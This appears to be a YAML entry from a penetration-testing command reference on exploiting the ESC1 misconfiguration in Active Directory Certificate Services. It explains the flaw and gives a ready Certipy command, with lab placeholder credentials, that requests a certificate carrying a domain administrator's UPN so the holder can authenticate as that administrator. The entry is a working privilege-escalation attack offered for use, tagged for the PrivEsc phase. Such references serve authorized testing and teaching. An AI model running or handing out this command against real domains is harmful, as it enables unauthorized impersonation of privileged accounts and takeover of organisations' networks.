---
description: |
  ESC1 is an ADCS misconfiguration where a certificate template allows low-privileged users to enroll, permits the requester to supply an arbitrary Subject Alternative Name (SAN), and includes the Client Authentication EKU. Certipy's `req` command exploits this by requesting a certificate from the vulnerable template while setting the SAN (`-upn`) to a privileged account, such as a domain administrator, resulting in a PFX certificate usable to authenticate as that account.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: john

  	Password: password123

  	CA name: test-CA

  	Template name: ESC1-Vulnerable

  	Impersonated UPN: administrator@test.local

command: |
  certipy req -u john@test.local -p password123 -dc-ip 10.10.10.1 -ca test-CA -template ESC1-Vulnerable -upn administrator@test.local
items:
  - Username
  - Password
services:
  - ADCS
OS:
  - Linux
phases:
  - PrivEsc
references:
  - https://github.com/ly4k/Certipy
  - https://posts.specterops.io/certified-pre-owned-d95910965cd2
---
